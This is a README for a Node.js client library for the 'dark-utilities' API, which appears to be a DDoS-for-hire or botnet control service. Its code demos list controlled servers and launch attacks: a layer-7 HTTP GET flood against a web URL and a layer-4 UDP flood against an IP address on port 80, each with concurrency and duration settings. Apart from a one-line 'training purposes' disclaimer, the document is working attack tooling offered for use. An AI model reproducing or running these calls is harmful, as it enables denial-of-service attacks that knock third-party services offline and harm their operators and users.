# Dark-Utilities API Node-Js
 Description :
   * -> Using the dark-utilities API in node js
   * -> Utilisation de l'API dark-utilities en node js

 ### Dependencies npm :
  * [phin](https://www.npmjs.com/package/phin "lien")

 ### Require :
  * -> [Node-Js](https://www.digitalocean.com/community/tutorials/how-to-install-node-js-on-ubuntu-20-04-fr)
 
### Installation :
  * To use it you need to have dark-utilities and install phin `npm i phin`

### Quick Demos

Get Status code (API)
```js
darkutilities.StatusApi().then(status => {
    console.log(status);
});
```

Get User Information
```js
darkutilities.getUserInfo().then(info => {
    console.log(info);
});
```

Get Server List
```js
darkutilities.getServerList().then(server => {
    console.log(server);
});
```

Get Server Info
```js
darkutilities.getServerInfo('fd06d2f5192fd94341543d15ae8158bb').then(server => {
    console.log(server);
});
```

Send attack ddos-layer7
```js
darkutilities.sendAttack('ddos-layer7', {
    'method': 'GET',
    'target': 'https://exemple.com/hit',
    'concurrents': 100,
    'time': 20
}, [
    { "server_id": "fd06d2f5192fd94341543d15ae8158bb", 'server_selected': true },
]).then(attack => {
    console.log(attack);
});
```

Send attacks ddos-layer4
```js
darkutilities.sendAttack('ddos-layer4', {
    'method': 'UDP',
    'target': '1.1.1.1',
    'port': 80,
    'concurrents': 10,
    'time': 20
}).then(attack => {
    console.log(attack);
});
```

Get Attack List
```js
darkutilities.getAttacks().then(attacks => {
    console.log(attacks);
});
```

This script was made for training purposes
